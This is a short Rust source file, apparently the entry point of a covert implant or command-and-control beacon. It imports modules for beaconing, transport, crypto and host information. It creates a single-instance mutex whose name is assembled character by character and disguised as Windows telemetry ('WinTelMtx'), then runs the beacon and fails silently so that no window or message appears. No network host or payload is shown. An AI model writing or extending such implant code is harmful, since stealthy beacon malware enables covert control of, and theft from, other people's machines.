mod beacon;
mod config;
mod crypto;
mod framing;
mod hostinfo;
mod modules;
mod transport;

fn main() {
    // Mutex nommé : empêche les instances multiples (watchdog).
    #[cfg(windows)]
    let _mutex = unsafe {
        windows_sys::Win32::System::Threading::CreateMutexW(
            std::ptr::null(),
            1,
            [b'G' as u16, b'l' as u16, b'o' as u16, b'b' as u16, b'a' as u16, b'l' as u16,
             b'\\' as u16, b'W' as u16, b'i' as u16, b'n' as u16, b'T' as u16, b'e' as u16,
             b'l' as u16, b'M' as u16, b't' as u16, b'x' as u16, 0].as_ptr(),
        )
    };
    #[cfg(windows)]
    if unsafe { windows_sys::Win32::Foundation::GetLastError() } == 183 {
        return; // ERROR_ALREADY_EXISTS — une autre instance tourne déjà
    }

    match beacon::Beacon::new() {
        Ok(mut b) => b.run(),
        Err(e) => {
            // Échec silencieux : pas de fenêtre, pas de message.
            let _ = e;
        }
    }
}
